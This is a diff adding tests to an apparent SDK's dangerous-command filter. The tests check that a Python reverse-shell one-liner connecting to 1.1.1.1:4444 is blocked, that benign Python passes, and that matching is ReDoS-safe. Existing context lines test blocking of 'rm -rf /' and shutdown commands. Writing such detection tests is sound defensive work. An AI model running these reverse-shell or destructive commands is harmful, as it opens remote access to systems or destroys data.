@@ -386,3 +386,30 @@ class TestClaudeSDKIntegration:
         assert sdk._is_dangerous_command("RM -RF /") is not None
         assert sdk._is_dangerous_command("Sudo Rm /file") is not None
         assert sdk._is_dangerous_command("SHUTDOWN") is not None
+
+
+
+# ---------------------------------------------------------------------------
+# Reverse shell detection 
+# ---------------------------------------------------------------------------
+
+
+class TestReverseShellDetection:
+    def test_python_reverse_shell_detected(self):
+        cmd = 'python -c "import socket;s=socket.socket();s.connect((\'1.1.1.1\',4444))"'
+        assert _is_blocked(cmd), "Should detect python reverse shell"
+
+    def test_python_legit_not_flagged(self):
+        cmd = 'python -c "print(\'hello\')"'
+        assert not _is_blocked(cmd), "Should NOT block normal python command"
+
+    def test_no_redos_performance(self):
+        import time
+
+        cmd = 'python -c "' + 'socket' * 2000 + 'X"'
+
+        start = time.perf_counter()
+        _is_blocked(cmd)
+        duration = time.perf_counter() - start
+
+        assert duration < 0.1, "Regex should not cause slowdown (ReDoS safe)"
